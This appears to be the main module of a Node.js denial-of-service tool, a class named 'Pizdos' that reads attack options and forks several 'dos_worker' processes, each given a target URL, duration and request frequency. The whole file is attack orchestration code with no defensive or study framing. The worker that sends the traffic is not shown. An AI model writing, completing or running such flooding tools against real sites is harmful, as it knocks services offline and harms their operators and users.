// ---------------------------- Imports. ---------------------------------
const fs = require('fs'),
      cp = require('child_process')

// --------------------------- Main class. -------------------------------
class Pizdos {
    // Public.
    /**
     * Starts attack on url using options.
     * @param {string} url 
     * @param {object} userOptions 
     */
    static startAttack(url, userOptions) {
        fs.readFile('./config/standart-options.json',
                    'utf8',
                    (err, data) => {
            if (err) throw err
            
            const options = Object.assign(JSON.parse(data), userOptions)

            this.attack(url,
                    options.processesCount,
                    options.attackDuration,
                    options.requestsFrequency)
        })
    }

    // Private.
    /**
     * Starts attack on url.
     * @param {string} url 
     * @param {number} processesCount 
     * @param {number} duration 
     * @param {number} frequency 
     */
    static attack(url, processesCount, duration, frequency) {
        console.log('Attack is started.')
        for (let i = 1; i <= processesCount; i++) {
            cp.fork('./src/dos_worker', [url, duration, frequency, i])
            console.log(`${i} process is started.`)
        }
    }
}

// ---------------------------- Exports. ---------------------------------
module.exports = Pizdos